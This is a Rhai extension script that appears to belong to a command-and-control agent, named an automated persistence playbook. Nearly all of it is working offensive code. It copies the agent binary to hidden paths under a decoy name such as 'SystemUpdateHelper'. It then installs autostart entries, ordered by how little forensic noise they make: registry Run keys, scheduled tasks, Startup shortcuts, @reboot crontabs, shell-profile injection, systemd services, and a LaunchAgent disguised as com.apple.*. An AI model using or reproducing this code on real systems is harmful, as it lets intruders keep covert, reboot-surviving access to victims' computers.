// extensions/auto_persist.rhai
//
// Automated persistence playbook.
//
// Mirrors the full behaviour of the Rust `persist:*` handlers:
//   1. stable_drop — copies the binary to a platform-specific hidden
//      location and renames it to LABEL, so persistence points at a
//      stable path rather than wherever the agent was first launched.
//   2. Platform detection and privilege check.
//   3. Ordered method playbook — lowest forensic noise first, stops on
//      first success.
//   4. Structured JSON return for the IOC tracker.
//
// stable_drop destination (mirrors Rust handler exactly):
//   Windows  %APPDATA%\Microsoft\<LABEL>.exe
//   Linux    ~/.local/bin/<LABEL>           (chmod 755)
//   macOS    ~/Library/Application Support/<LABEL>/<LABEL>  (chmod 755)
//
// MITRE ATT&CK
//   Windows  T1547.001 Registry Run Keys (HKCU then HKLM if elevated)
//            T1053.005 Scheduled Task    (onlogon, limited privilege)
//            T1547.001 Startup Folder    (.lnk shortcut)
//   Linux    T1053.003 Cron              (@reboot user crontab)
//            T1546.004 Shell Profile     (~/.profile + ~/.bashrc)
//            T1543.002 Systemd User      (~/.config/systemd/user/)
//            T1543.002 Systemd System    (/etc/systemd/system/, root only)
//   macOS    T1543.001 LaunchAgent       (~/Library/LaunchAgents/ plist)
//            T1053.003 Cron              (@reboot user crontab)
//            T1546.004 Zsh / Profile     (~/.zprofile or ~/.profile)
//
// Usage
//   extension load auto_persist
//   extension load auto_persist <label>
//
// Return JSON
//   { "result": "success"|"all_failed"|"already_persisted"|"error",
//     "platform", "privilege",
//     "binary":        "/original/path/to/agent",
//     "stable_binary": "/copied/hidden/path/<LABEL>",
//     "label", "method", "technique",
//     "attempts": [ {method, technique, status, detail, cleanup_cmd} ],
//     "ioc":      {type, path, detail, cleanup_cmd, technique}  // on success
//   }

// ── Config ────────────────────────────────────────────────────────────
let LABEL = "SystemUpdateHelper";
// In Rhai, trim() mutates the string in-place and returns ().
// Do NOT chain .len() on its result — assign first, then check length.
if args.len() > 0 {
    let a = args[0];
    a.trim();           // mutate in place
    if a.len() > 0 {
        LABEL = a;
    }
}

// ── Platform detection ────────────────────────────────────────────────
let is_windows = internal_env("SystemRoot").contains("Windows");
let uname      = exec_os("uname -s 2>/dev/null");
let is_macos   = uname.contains("Darwin");
let is_linux   = !is_windows && !is_macos;
let platform   = if is_windows { "windows" } else if is_macos { "macos" } else { "linux" };

print_log("[auto_persist] platform=" + platform + "  label=" + LABEL);

// ── Locate the running binary ─────────────────────────────────────────
let self_path = "";

if is_windows {
    self_path = exec_os(
        "powershell -NoProfile -NonInteractive -Command " +
        "\"[System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName\""
    );
    self_path.replace("\r\n", "");
    self_path.replace("\r",   "");
    self_path.replace("\n",   "");
    self_path.trim();
} else if is_linux {
    self_path = exec_os("readlink -f /proc/self/exe 2>/dev/null");
    self_path.trim();
} else {
    // macOS: exec_os child shell's $PPID == agent PID
    self_path = exec_os(
        "lsof -p $PPID 2>/dev/null | awk '$4==\"txt\" && $5==\"REG\" {print $NF}' | head -1"
    );
    self_path.trim();
    if self_path.len() < 3 || self_path.contains("Error") {
        self_path = exec_os("ps -p $PPID -o comm= 2>/dev/null");
        self_path.trim();
    }
}

if self_path.len() < 3 || self_path.contains("Error") {
    return "{\"result\":\"error\"," +
           "\"detail\":\"Could not determine agent binary path\"," +
           "\"platform\":\"" + platform + "\"}";
}

print_log("[auto_persist] binary=" + self_path);

// ── Privilege detection ───────────────────────────────────────────────
let is_elevated = false;
if is_windows {
    let groups = exec_os("whoami /groups 2>nul");
    is_elevated = groups.contains("S-1-16-12288");
} else {
    let _uid = exec_os("id -u 2>/dev/null");
    _uid.trim();
    is_elevated = _uid == "0";
}
let priv_level = if is_elevated { "elevated" } else { "user" };
print_log("[auto_persist] privilege=" + priv_level);

// ═══════════════════════════════════════════════════════════════════════
// stable_drop — copy binary to a persistent, hidden location and rename
//               it to LABEL (mirrors the Rust persistence handlers).
//
//   Windows  %APPDATA%\Microsoft\<LABEL>.exe
//   Linux    ~/.local/bin/<LABEL>           chmod 755
//   macOS    ~/Library/Application Support/<LABEL>/<LABEL>  chmod 755
//
// Idempotent: if self_path is already the stable location, skip copy.
// Aborts the entire script if the copy cannot be made — persistence
// pointing at a volatile source path has no operational value.
// ═══════════════════════════════════════════════════════════════════════

let stable_path = "";
let stable_ok   = false;

if is_windows {
    let appdata = internal_env("APPDATA");

    // Preserve source extension (defaults to .exe on Windows)
    let ext = ".exe";
    let fname_segs = self_path.split("\\");
    let fname      = fname_segs[fname_segs.len() - 1];
    let dot_segs   = fname.split(".");
    if dot_segs.len() > 1 {
        ext = "." + dot_segs[dot_segs.len() - 1];
    }

    stable_path = appdata + "\\Microsoft\\" + LABEL + ext;

    if self_path == stable_path {
        stable_ok = true;
    } else {
        exec_os("copy /y \"" + self_path + "\" \"" + stable_path + "\" >nul 2>&1");
        let chk = exec_os("cmd /c \"if exist \\\"" + stable_path + "\\\" echo OK\"");
        stable_ok = chk.contains("OK");
    }

} else if is_linux {
    let home = internal_env("HOME");
    stable_path = home + "/.local/bin/" + LABEL;

    if self_path == stable_path {
        stable_ok = true;
    } else {
        exec_os("mkdir -p \"" + home + "/.local/bin\" 2>/dev/null");
        exec_os("cp -f \"" + self_path + "\" \"" + stable_path + "\" 2>/dev/null");
        exec_os("chmod 755 \"" + stable_path + "\" 2>/dev/null");
        let chk = exec_os("test -x \"" + stable_path + "\" && echo OK 2>/dev/null");
        stable_ok = chk.contains("OK");
    }

} else {
    // macOS: ~/Library/Application Support/<LABEL>/<LABEL>
    let home       = internal_env("HOME");
    let stable_dir = home + "/Library/Application Support/" + LABEL;
    stable_path    = stable_dir + "/" + LABEL;

    if self_path == stable_path {
        stable_ok = true;
    } else {
        exec_os("mkdir -p \"" + stable_dir + "\" 2>/dev/null");
        exec_os("cp -f \"" + self_path + "\" \"" + stable_path + "\" 2>/dev/null");
        exec_os("chmod 755 \"" + stable_path + "\" 2>/dev/null");
        let chk = exec_os("test -x \"" + stable_path + "\" && echo OK 2>/dev/null");
        stable_ok = chk.contains("OK");
    }
}

if !stable_ok {
    let sp_e = stable_path; sp_e.replace("\"", "'");
    let sb_e = self_path;   sb_e.replace("\"", "'");
    return "{\"result\":\"error\"," +
           "\"detail\":\"stable_drop failed — could not copy to " + sp_e + "\"," +
           "\"platform\":\"" + platform + "\"," +
           "\"binary\":\"" + sb_e + "\"}";
}

print_log("[auto_persist] stable_path=" + stable_path);

// ── Already-persisted fast-path ───────────────────────────────────────
// Check whether stable_path is already registered, not self_path —
// by this point stable_path is the authoritative path for this agent.

let already = "";

if is_windows {
    let run_q = exec_os("reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"" + LABEL + "\" 2>nul");
    let tsk_q = exec_os("schtasks /query /tn \"" + LABEL + "\" 2>nul");
    if run_q.contains(LABEL) { already = "registry_run_hkcu"; }
    if already == "" && tsk_q.contains(LABEL) { already = "scheduled_task"; }
} else if is_linux {
    let cron_q = exec_os("crontab -l 2>/dev/null");
    if cron_q.contains(stable_path) { already = "crontab"; }
    if already == "" {
        let prof_q = internal_read(internal_env("HOME") + "/.profile");
        if prof_q.contains(stable_path) { already = "profile"; }
    }
} else {
    let la_file = internal_env("HOME") + "/Library/LaunchAgents/com.apple." + LABEL + ".plist";
    let la_chk  = exec_os("test -f \"" + la_file + "\" && echo EXISTS 2>/dev/null");
    if la_chk.contains("EXISTS") { already = "launchagent"; }
}

if already != "" {
    let sb_e = stable_path; sb_e.replace("\"", "'");
    let s_e  = self_path;   s_e.replace("\"", "'");
    print_log("[auto_persist] already persisted via " + already);
    return "{\"result\":\"already_persisted\"," +
           "\"method\":\"" + already + "\"," +
           "\"platform\":\"" + platform + "\"," +
           "\"binary\":\"" + s_e + "\"," +
           "\"stable_binary\":\"" + sb_e + "\"}";
}

// ── Attempt accumulator ───────────────────────────────────────────────
let attempts_json  = "";
let success_method = "";
let success_tech   = "";
let ioc_type       = "";
let ioc_path       = "";
let ioc_detail     = "";
let ioc_cleanup    = "";

// ═══════════════════════════════════════════════════════════════════════
// WINDOWS PLAYBOOK  (all commands reference stable_path)
// ═══════════════════════════════════════════════════════════════════════

if is_windows {

    // ── Method 1: HKCU Registry Run Key ─────────────── T1547.001 ──
    // No elevation.  Fires at user logon.  REG_SZ → stable_path.
    // Noise: LOW.  Detection: Sysmon 13, ETW Registry.
    if success_method == "" {
        let rk = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        let out = exec_os(
            "reg add \"" + rk + "\" /v \"" + LABEL +
            "\" /t REG_SZ /d \"" + stable_path + "\" /f 2>&1"
        );
        let ok = out.contains("successfully");
        let det = if ok { rk + "\\" + LABEL + " → " + stable_path } else { out };
        det.replace("\"", "'");
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"registry_run_hkcu\",\"technique\":\"T1547.001\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:run_remove " + LABEL + "\"}";
        if ok {
            success_method = "registry_run_hkcu"; success_tech = "T1547.001";
            ioc_type = "registry"; ioc_path = rk + "\\" + LABEL;
            ioc_detail = "HKCU Run → " + stable_path;
            ioc_cleanup = "persist:run_remove " + LABEL;
        }
    }

    // ── Method 2: Scheduled Task (onlogon) ──────────── T1053.005 ──
    // No elevation.  More robust than Run keys; survives profile resets.
    // Noise: MEDIUM.  Detection: Event 4698, schtasks.exe spawn.
    if success_method == "" {
        let out = exec_os(
            "schtasks /create /tn \"" + LABEL +
            "\" /tr \"" + stable_path +
            "\" /sc onlogon /rl limited /f 2>&1"
        );
        let ok = out.contains("SUCCESS") || out.contains("successfully");
        let det = if ok { "Task \\" + LABEL + " (onlogon, limited) → " + stable_path } else { out };
        det.replace("\"", "'");
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"scheduled_task\",\"technique\":\"T1053.005\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:task_remove " + LABEL + "\"}";
        if ok {
            success_method = "scheduled_task"; success_tech = "T1053.005";
            ioc_type = "task"; ioc_path = "\\Microsoft\\Windows\\Task Scheduler\\" + LABEL;
            ioc_detail = "Scheduled task (onlogon) → " + stable_path;
            ioc_cleanup = "persist:task_remove " + LABEL;
        }
    }

    // ── Method 3: Startup Folder .lnk shortcut ──────── T1547.001 ──
    // No elevation.  Widely scanned by AV — last resort before HKLM.
    // Noise: HIGH.  Detection: Sysmon 11 (file create in startup path).
    if success_method == "" {
        let startup = exec_os(
            "powershell -NoProfile -Command \"[Environment]::GetFolderPath('Startup')\""
        );
        startup.trim(); startup.replace("\r\n",""); startup.replace("\n","");
        let lnk = startup + "\\" + LABEL + ".lnk";
        let ps_cmd =
            "$s=(New-Object -COM WScript.Shell).CreateShortcut('" + lnk +
            "');$s.TargetPath='" + stable_path + "';$s.Save()";
        exec_os("powershell -NoProfile -Command \"" + ps_cmd + "\" 2>&1");
        let chk = exec_os("cmd /c \"if exist \\\"" + lnk + "\\\" echo EXISTS\" 2>nul");
        let ok  = chk.contains("EXISTS");
        let det = if ok { lnk + " → " + stable_path } else { "shortcut create failed" };
        det.replace("\"", "'");
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"startup_folder\",\"technique\":\"T1547.001\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:startup_remove " + LABEL + ".lnk\"}";
        if ok {
            success_method = "startup_folder"; success_tech = "T1547.001";
            ioc_type = "file"; ioc_path = lnk;
            ioc_detail = "Startup shortcut → " + stable_path;
            ioc_cleanup = "persist:startup_remove " + LABEL + ".lnk";
        }
    }

    // ── Method 4: HKLM Run Key (elevated only) ──────── T1547.001 ──
    // System-wide; fires for every user.  Skipped without elevation.
    if success_method == "" && is_elevated {
        let rk = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        let out = exec_os(
            "reg add \"" + rk + "\" /v \"" + LABEL +
            "\" /t REG_SZ /d \"" + stable_path + "\" /f 2>&1"
        );
        let ok = out.contains("successfully");
        let det = if ok { rk + "\\" + LABEL + " → " + stable_path } else { out };
        det.replace("\"", "'");
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"registry_run_hklm\",\"technique\":\"T1547.001\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:run_hklm_remove " + LABEL + "\"}";
        if ok {
            success_method = "registry_run_hklm"; success_tech = "T1547.001";
            ioc_type = "registry"; ioc_path = rk + "\\" + LABEL;
            ioc_detail = "HKLM Run (system-wide) → " + stable_path;
            ioc_cleanup = "persist:run_hklm_remove " + LABEL;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
// LINUX PLAYBOOK  (all commands reference stable_path)
// ═══════════════════════════════════════════════════════════════════════

if is_linux {

    // ── Method 1: User Crontab @reboot ──────────────── T1053.003 ──
    // No elevation.  Lowest footprint: only artifact is the crontab spool.
    // Atomic install via temp file (mirrors Rust handler).
    // Noise: LOW.  Detection: auditd crontab execve, spool mtime.
    if success_method == "" {
        let cron_cur = exec_os("crontab -l 2>/dev/null");
        if !cron_cur.contains(stable_path) {
            let entry    = "@reboot " + stable_path;
            cron_cur.trim();
            let new_cron = if cron_cur.len() > 0 {
                cron_cur + "\n" + entry + "\n"
            } else { entry + "\n" };
            let tmp = "/tmp/.cron_" + LABEL;
            internal_write(tmp, new_cron);
            exec_os("crontab " + tmp + " 2>/dev/null");
            exec_os("rm -f \"" + tmp + "\" 2>/dev/null");
        }
        let verify = exec_os("crontab -l 2>/dev/null");
        let ok     = verify.contains(stable_path);
        let det    = if ok { "@reboot " + stable_path } else { "crontab write failed" };
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"crontab\",\"technique\":\"T1053.003\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:cron_remove " + stable_path + "\"}";
        if ok {
            success_method = "crontab"; success_tech = "T1053.003";
            ioc_type = "crontab"; ioc_path = "user crontab (@reboot)";
            ioc_detail = "@reboot " + stable_path;
            ioc_cleanup = "persist:cron_remove " + stable_path;
        }
    }

    // ── Method 2: Shell Profile injection ───────────── T1546.004 ──
    // No elevation.  Appends sentinel-wrapped nohup block to
    // ~/.profile AND ~/.bashrc (mirrors Rust handler).
    // Noise: LOW.  Detection: inotify on home dir, mtime change.
    if success_method == "" {
        let home = internal_env("HOME");
        let ss   = "# >>> RCM_PERSIST_START";
        let se   = "# >>> RCM_PERSIST_END";
        let blk  = "\n" + ss + "\nnohup \"" + stable_path + "\" &>/dev/null &\n" + se + "\n";
        let first_ok   = false;
        let first_path = "";
        for tgt in [home + "/.profile", home + "/.bashrc"] {
            let ex = internal_read(tgt);
            if ex.contains(ss) { continue; }
            let base = if ex.contains("Error") { "" } else { ex };
            if internal_write(tgt, base + blk) == "Success" && !first_ok {
                first_ok   = true;
                first_path = tgt;
            }
        }
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"profile\",\"technique\":\"T1546.004\"," +
            "\"status\":\"" + if first_ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + first_path + "\"," +
            "\"cleanup_cmd\":\"persist:profile_remove " + stable_path + "\"}";
        if first_ok {
            success_method = "profile"; success_tech = "T1546.004";
            ioc_type = "file"; ioc_path = home + "/.profile";
            ioc_detail = "nohup block → " + stable_path;
            ioc_cleanup = "persist:profile_remove " + stable_path;
        }
    }

    // ── Method 3: Systemd user service ──────────────── T1543.002 ──
    // No elevation.  Unit file + wants/ symlink (mirrors Rust handler).
    // Noise: MEDIUM.  Detection: journald unit activation log.
    if success_method == "" {
        let home      = internal_env("HOME");
        let svc_dir   = home + "/.config/systemd/user";
        let wants_dir = svc_dir + "/default.target.wants";
        let unit_f    = svc_dir + "/" + LABEL + ".service";
        let wants_lnk = wants_dir + "/" + LABEL + ".service";
        let body =
            "[Unit]\nDescription=" + LABEL + " (system component)\nAfter=network.target\n\n" +
            "[Service]\nType=simple\nExecStart=" + stable_path + "\nRestart=always\nRestartSec=10\n\n" +
            "[Install]\nWantedBy=default.target\n";
        exec_os("mkdir -p \"" + svc_dir + "\" \"" + wants_dir + "\" 2>/dev/null");
        let ok = internal_write(unit_f, body) == "Success";
        if ok {
            exec_os("ln -sf \"" + unit_f + "\" \"" + wants_lnk + "\" 2>/dev/null");
            exec_os("systemctl --user daemon-reload 2>/dev/null");
            exec_os("systemctl --user start \"" + LABEL + "\" 2>/dev/null");
        }
        let det = if ok { unit_f + " (+ wants symlink)" } else { "unit file write failed" };
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"systemd_user\",\"technique\":\"T1543.002\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:systemd_remove " + LABEL + "\"}";
        if ok {
            success_method = "systemd_user"; success_tech = "T1543.002";
            ioc_type = "service"; ioc_path = unit_f;
            ioc_detail = "Systemd user service " + LABEL + " → " + stable_path;
            ioc_cleanup = "persist:systemd_remove " + LABEL;
        }
    }

    // ── Method 4: Systemd system service (root only) ── T1543.002 ──
    // System-wide; fires before any user session.
    // Skipped without elevation.
    if success_method == "" && is_elevated {
        let unit_f    = "/etc/systemd/system/" + LABEL + ".service";
        let wants_lnk = "/etc/systemd/system/multi-user.target.wants/" + LABEL + ".service";
        let body =
            "[Unit]\nDescription=" + LABEL + " (system component)\nAfter=network.target\n\n" +
            "[Service]\nType=simple\nExecStart=" + stable_path + "\nRestart=always\nRestartSec=10\n\n" +
            "[Install]\nWantedBy=multi-user.target\n";
        let ok = internal_write(unit_f, body) == "Success";
        if ok {
            exec_os("ln -sf \"" + unit_f + "\" \"" + wants_lnk + "\" 2>/dev/null");
            exec_os("systemctl daemon-reload 2>/dev/null");
            exec_os("systemctl enable \"" + LABEL + "\" 2>/dev/null");
            exec_os("systemctl start \"" + LABEL + "\" 2>/dev/null");
        }
        let det = if ok { unit_f } else { "unit file write failed (root required)" };
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"systemd_system\",\"technique\":\"T1543.002\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:systemd_remove " + LABEL + "\"}";
        if ok {
            success_method = "systemd_system"; success_tech = "T1543.002";
            ioc_type = "service"; ioc_path = unit_f;
            ioc_detail = "Systemd system service " + LABEL + " → " + stable_path;
            ioc_cleanup = "persist:systemd_remove " + LABEL;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════
// MACOS PLAYBOOK  (all commands reference stable_path)
// ═══════════════════════════════════════════════════════════════════════

if is_macos {

    // ── Method 1: LaunchAgent plist ──────────────────── T1543.001 ──
    // User-level; RunAtLoad + KeepAlive.  Mirrors Rust handler exactly:
    // write plist, chmod 600, launchctl load.
    // Noise: LOW-MEDIUM.  Detection: ESF, Unified Log launchd.
    if success_method == "" {
        let home     = internal_env("HOME");
        let la_label = "com.apple." + LABEL;
        let la_dir   = home + "/Library/LaunchAgents";
        let la_file  = la_dir + "/" + la_label + ".plist";
        let plist    =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"                       +
            "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "           +
            "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"             +
            "<plist version=\"1.0\">\n<dict>\n"                                  +
            "    <key>Label</key>\n    <string>" + la_label + "</string>\n"      +
            "    <key>ProgramArguments</key>\n    <array>\n"                     +
            "        <string>" + stable_path + "</string>\n    </array>\n"       +
            "    <key>RunAtLoad</key>\n    <true/>\n"                            +
            "    <key>KeepAlive</key>\n    <true/>\n"                            +
            "</dict>\n</plist>\n";
        exec_os("mkdir -p \"" + la_dir + "\" 2>/dev/null");
        let ok = internal_write(la_file, plist) == "Success";
        if ok {
            exec_os("chmod 600 \"" + la_file + "\" 2>/dev/null");
            exec_os("launchctl load \"" + la_file + "\" 2>/dev/null");
        }
        let det = if ok { la_file + " (label: " + la_label + ")" } else { "plist write failed" };
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"launchagent\",\"technique\":\"T1543.001\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:launchagent_remove " + la_label + "\"}";
        if ok {
            success_method = "launchagent"; success_tech = "T1543.001";
            ioc_type = "file"; ioc_path = la_file;
            ioc_detail = "LaunchAgent " + la_label + " → " + stable_path;
            ioc_cleanup = "persist:launchagent_remove " + la_label;
        }
    }

    // ── Method 2: Crontab @reboot ────────────────────── T1053.003 ──
    // Less idiomatic on macOS but broadly functional.
    if success_method == "" {
        let cron_cur = exec_os("crontab -l 2>/dev/null");
        if !cron_cur.contains(stable_path) {
            let entry    = "@reboot " + stable_path;
            cron_cur.trim();
            let new_cron = if cron_cur.len() > 0 {
                cron_cur + "\n" + entry + "\n"
            } else { entry + "\n" };
            let tmp = "/tmp/.cron_" + LABEL;
            internal_write(tmp, new_cron);
            exec_os("crontab " + tmp + " 2>/dev/null");
            exec_os("rm -f \"" + tmp + "\" 2>/dev/null");
        }
        let verify = exec_os("crontab -l 2>/dev/null");
        let ok     = verify.contains(stable_path);
        let det    = if ok { "@reboot " + stable_path } else { "crontab write failed" };
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"crontab\",\"technique\":\"T1053.003\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:cron_remove " + stable_path + "\"}";
        if ok {
            success_method = "crontab"; success_tech = "T1053.003";
            ioc_type = "crontab"; ioc_path = "user crontab (@reboot)";
            ioc_detail = "@reboot " + stable_path;
            ioc_cleanup = "persist:cron_remove " + stable_path;
        }
    }

    // ── Method 3: Zsh / Shell profile injection ──────── T1546.004 ──
    // ~/.zprofile first (Catalina+), falls back to ~/.profile.
    // Fires on every interactive login / SSH session.
    if success_method == "" {
        let home = internal_env("HOME");
        let ss   = "# >>> RCM_PERSIST_START";
        let se   = "# >>> RCM_PERSIST_END";
        let blk  = "\n" + ss + "\nnohup \"" + stable_path + "\" &>/dev/null &\n" + se + "\n";
        let tgt  = home + "/.zprofile";
        let ex   = internal_read(tgt);
        if ex.contains("Error") {
            tgt = home + "/.profile";
            ex  = internal_read(tgt);
        }
        let ok = false;
        if !ex.contains(ss) {
            let base = if ex.contains("Error") { "" } else { ex };
            ok = internal_write(tgt, base + blk) == "Success";
        }
        let det = if ok { tgt } else { "write failed" };
        if attempts_json.len() > 0 { attempts_json += ","; }
        attempts_json += "{\"method\":\"shell_profile\",\"technique\":\"T1546.004\"," +
            "\"status\":\"" + if ok { "success" } else { "failed" } + "\"," +
            "\"detail\":\"" + det + "\"," +
            "\"cleanup_cmd\":\"persist:profile_remove " + stable_path + "\"}";
        if ok {
            success_method = "shell_profile"; success_tech = "T1546.004";
            ioc_type = "file"; ioc_path = tgt;
            ioc_detail = "nohup block in " + tgt + " → " + stable_path;
            ioc_cleanup = "persist:profile_remove " + stable_path;
        }
    }
}

// ── Unsupported platform ──────────────────────────────────────────────
if !is_windows && !is_linux && !is_macos {
    return "{\"result\":\"error\",\"detail\":\"Unsupported platform: " +
           uname.trim();
           uname + "\",\"platform\":\"unknown\"}";
}

// ── Build output JSON ─────────────────────────────────────────────────
let result_str = if success_method != "" { "success" } else { "all_failed" };

let s_e  = self_path;      s_e.replace("\"", "'");
let sb_e = stable_path;    sb_e.replace("\"", "'");
let sm_e = success_method; sm_e.replace("\"", "'");
let st_e = success_tech;   st_e.replace("\"", "'");
let ip_e = ioc_path;       ip_e.replace("\"", "'");
let id_e = ioc_detail;     id_e.replace("\"", "'");
let ic_e = ioc_cleanup;    ic_e.replace("\"", "'");

let ioc_block = "";
if success_method != "" {
    ioc_block =
        ",\"ioc\":{" +
        "\"type\":\"" + ioc_type + "\"," +
        "\"path\":\"" + ip_e + "\"," +
        "\"detail\":\"" + id_e + "\"," +
        "\"cleanup_cmd\":\"" + ic_e + "\"," +
        "\"technique\":\"" + success_tech + "\"}";
}

print_log("[auto_persist] result=" + result_str + "  method=" + success_method);

return
    "{\"result\":\"" + result_str + "\"," +
    "\"platform\":\"" + platform + "\"," +
    "\"privilege\":\"" + priv_level + "\"," +
    "\"binary\":\"" + s_e + "\"," +
    "\"stable_binary\":\"" + sb_e + "\"," +
    "\"label\":\"" + LABEL + "\"," +
    "\"method\":\"" + sm_e + "\"," +
    "\"technique\":\"" + st_e + "\"," +
    "\"attempts\":[" + attempts_json + "]" +
    ioc_block + "}";
